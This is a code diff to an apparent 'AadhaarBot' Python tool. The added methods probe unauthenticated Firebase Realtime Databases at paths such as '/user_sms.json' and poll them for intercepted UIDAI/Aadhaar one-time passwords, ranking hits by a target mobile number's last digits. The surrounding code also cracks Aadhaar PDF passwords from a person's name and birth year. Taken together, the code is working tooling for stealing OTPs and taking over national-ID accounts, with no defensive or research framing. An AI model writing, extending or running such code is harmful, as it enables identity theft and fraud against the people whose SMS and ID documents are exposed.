@@ -8,9 +8,11 @@ import zipfile
 import json
 import re
 import requests
+import time
 from io import BytesIO
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlparse
 import urllib3
 
 # Suppress insecure SSL warnings from proxy forward tunneling
@@ -630,6 +632,139 @@ class AadhaarBot:
 
     def crack_pdf_with_name(self, pdf_path, name, birth_year=None, progress_callback=None):
         return self.cracker.crack_pdf(pdf_path, name, birth_year, progress_callback)
+
+    def normalize_firebase_url(self, url: str):
+        """Normalizes Firebase RTDB URL and returns base URL and candidate endpoints."""
+        url = url.strip()
+        if not url.startswith('http://') and not url.startswith('https://'):
+            url = 'https://' + url
+        parsed = urlparse(url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        endpoints = []
+        if parsed.path and parsed.path not in ('', '/'):
+            p = parsed.path
+            if not p.endswith('.json'):
+                p += '.json'
+            endpoints.append(f"{base}{p}")
+        for path in ('/messages.json', '/user_sms.json', '/profex_incoming.json', '/incoming.json', '/.json'):
+            cand = f"{base}{path}"
+            if cand not in endpoints:
+                endpoints.append(cand)
+        return base, endpoints
+
+    def test_firebase_connection(self, firebase_url: str):
+        """
+        Tests whether the Firebase Realtime Database is accessible without authentication.
+        Returns (is_accessible, info_message).
+        """
+        try:
+            base, endpoints = self.normalize_firebase_url(firebase_url)
+            session = requests.Session()
+            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+            for ep in endpoints[:3]:
+                try:
+                    resp = session.get(ep, timeout=5)
+                    if resp.status_code == 200:
+                        return True, "Connected successfully"
+                    elif resp.status_code in (401, 403):
+                        return False, "Permission denied (Database is private or requires authentication)"
+                except Exception:
+                    continue
+            return False, "Unable to reach database (Connection failed or invalid URL)"
+        except Exception as e:
+            return False, str(e)
+
+    def fetch_otp_from_firebase(self, firebase_url: str, min_timestamp: float = None, timeout: int = 75, poll_interval: int = 3, target_mobile: str = None, exclude_otps: list = None):
+        """
+        Polls a Firebase Realtime Database for incoming UIDAI / Aadhaar OTP SMS.
+        Matches 6-digit OTPs with UIDAI/Aadhaar keywords and optionally prioritizes the target mobile's last 4 digits.
+        Returns (found: bool, otp_code: Optional[str], full_text: Optional[str]).
+        """
+        base, endpoints = self.normalize_firebase_url(firebase_url)
+        exclude_set = set(str(x).strip() for x in (exclude_otps or []))
+        last4 = str(target_mobile).strip()[-4:] if target_mobile and len(str(target_mobile).strip()) >= 4 else None
+        min_ts = min_timestamp if min_timestamp is not None else (time.time() - 120)
+
+        deadline = time.time() + timeout
+        session = requests.Session()
+        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+
+        logger.info(f"Started monitoring Firebase RTDB ({base}) for Aadhaar OTP (timeout={timeout}s, min_ts={min_ts})")
+
+        while time.time() < deadline:
+            for ep in endpoints:
+                try:
+                    r = session.get(ep, timeout=5)
+                    if r.status_code != 200 or not r.content:
+                        continue
+                    data = r.json()
+                    if not data or not isinstance(data, (dict, list)):
+                        continue
+
+                    candidates = []
+
+                    def walk(obj, key_name=''):
+                        if isinstance(obj, dict):
+                            text_val = None
+                            for tk in ('message', 'text', 'body', 'msg', 'sms'):
+                                if tk in obj and isinstance(obj[tk], str):
+                                    text_val = obj[tk]
+                                    break
+
+                            ts_val = None
+                            for tsk in ('id', 'rawTs', 'timestamp', 'time'):
+                                if tsk in obj:
+                                    v = obj[tsk]
+                                    if isinstance(v, (int, float)) and v > 1000000000:
+                                        ts_val = v / 1000.0 if v > 100000000000 else v
+                                        break
+                            if ts_val is None and str(key_name).isdigit() and len(str(key_name)) >= 10:
+                                try:
+                                    v = float(key_name)
+                                    ts_val = v / 1000.0 if v > 100000000000 else v
+                                except Exception:
+                                    pass
+
+                            sender_val = str(obj.get('sender', '') or obj.get('from', '') or '')
+
+                            if text_val:
+                                t_lower = text_val.lower()
+                                s_lower = sender_val.lower()
+                                is_aadhaar = any(k in t_lower for k in ('aadhaar', 'uidai', 'myaadhaar', 'tathya')) or any(k in s_lower for k in ('uidai', 'aadhaar'))
+                                if is_aadhaar:
+                                    otps = re.findall(r'\b(\d{6})\b', text_val)
+                                    for otp in otps:
+                                        if otp not in exclude_set:
+                                            score = 0
+                                            if last4 and (f'XX{last4}' in text_val or f'xx{last4}' in t_lower or last4 in text_val):
+                                                score += 10
+                                            ts = ts_val if ts_val is not None else 0
+                                            if min_ts and ts and ts < min_ts:
+                                                continue
+                                            candidates.append((score, ts, otp, text_val))
+
+                            for k, v in obj.items():
+                                walk(v, k)
+                        elif isinstance(obj, list):
+                            for item in obj:
+                                walk(item)
+
+                    walk(data)
+                    if candidates:
+                        # Sort by score desc, then timestamp desc
+                        candidates.sort(key=lambda x: (x[0], x[1]), reverse=True)
+                        best = candidates[0]
+                        logger.info(f"Firebase OTP captured: OTP={best[2]}, Text='{best[3][:80]}...'")
+                        return True, best[2], best[3]
+
+                except Exception as e:
+                    logger.debug(f"Error querying Firebase endpoint {ep}: {e}")
+                    continue
+
+            time.sleep(poll_interval)
+
+        logger.warning(f"Firebase OTP polling timed out after {timeout}s on {base}")
+        return False, None, "Timeout waiting for OTP in Firebase DB"
 
 
 bot_api = AadhaarBot(proxy_url=os.environ.get("PROXY_URL", "").strip() or None)
